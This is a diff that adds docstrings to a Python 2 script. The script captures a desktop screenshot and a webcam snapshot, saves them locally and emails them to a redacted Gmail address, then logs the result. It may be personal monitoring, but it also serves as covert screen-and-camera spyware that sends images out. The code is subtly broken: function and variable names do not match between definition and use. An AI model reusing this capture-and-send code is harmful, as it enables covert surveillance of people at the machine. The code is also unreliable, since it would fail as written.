@@ -9,22 +9,26 @@ from PIL import ImageGrab
 import os
 
 def get_currecttime():
+	'''get currect time'''
 	open_time=time.strftime('%m%d%H%M',time.localtime(time.time()))
 	return open_time
 
 def get_desktopimg(correcttime):
+	'''get desktop photo and save'''
 	filename=r'F:/desktop' + correcttime + '.jpg'
 	pic=ImageGrab.grab()
 	pic.save(filename)
 	return filename
 
 def get_webcamimg(correcttime):
+	'''get camera photo and save'''
 	filename=r'F:/webcam' + correcttime + '.jpg'
 	cam=Device()
 	cam.saveSnapShot(filename,timestamp=3,boldfont=1,quality=75)
 	return filename
 
 def send_img(desktop,webcam):
+	'''send the photos to gmail'''
 	try:
 		from_mail='****@gmail.com'
 		to_mail='****@gmail.com'
@@ -52,6 +56,7 @@ def send_img(desktop,webcam):
 		return False
 
 def write_log(issuccess):
+	'''write info in to log'''
 	log_file_dir=r'F:/computer.log'
 	log_file=file(log_file_dit,'a')
 	log.file.write('at' + now_time + ' img saved success!')
@@ -67,6 +72,7 @@ now_time=get_correcttime()
 desktopimg=get_desktopimg(now_time)
 webcamimg=get_webcamimg(now_time)
 
+'''check whether the photos saved success.'''
 if os.path.isfile(desktopimg) and os.path.isfile(webcamimg):
 	MailIsSend=send_img(desktopimg,webcamimg)
 	write_log(MailIsSend)
